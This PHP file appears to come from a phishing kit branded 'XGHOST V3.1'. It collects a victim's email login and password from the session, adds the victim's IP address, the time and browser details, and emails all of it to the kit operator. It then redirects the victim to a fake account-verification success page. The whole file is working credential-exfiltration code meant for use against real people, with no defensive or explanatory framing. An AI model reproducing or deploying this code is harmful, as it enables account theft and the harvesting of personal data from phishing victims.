<?php
/*   
                          
*/


session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/Email.php');
include('../../functions/get_browser.php');
$XGHOST_MESSAGE .= "
<html>
<head><meta charset=\"UTF-8\"></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>EMAIL ACCEESS</font> ####################<br/>
±±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>EMAIL INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>🤑</font> [Email] = <font style='color:#0070ba;'>".$_SESSION['_login_email_']."</font><br>
<font style='color:#9c0000;'>🤑</font> [Password] = <font style='color:#0070ba;'>".$_SESSION['_passemail_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>🤑</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>🤑</font> [TIME/DATE] = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>🤑</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
################## <font style='color: #820000;'>BY XGHOST V3.1</font> #####################
</div></html>\n";

        $XGHOST_SUBJECT = "EMAIL ACCEES 😜 FROM : ".$_SESSION['_forlogin_']." 😜 ".$_POST['login_email']." ✪";
        $XGHOST_HEADERS .= "From:CRAZY<cantact>";
        $XGHOST_HEADERS .= $_POST['eMailAdd']."\n";
        $XGHOST_HEADERS .= "MIME-Version: 1.0\n";
        $XGHOST_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
       
        mail($XGHOST_EMAIL, $XGHOST_SUBJECT, $XGHOST_MESSAGE, $XGHOST_HEADERS);
		HEADER("Location: ../success/?verify_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
?>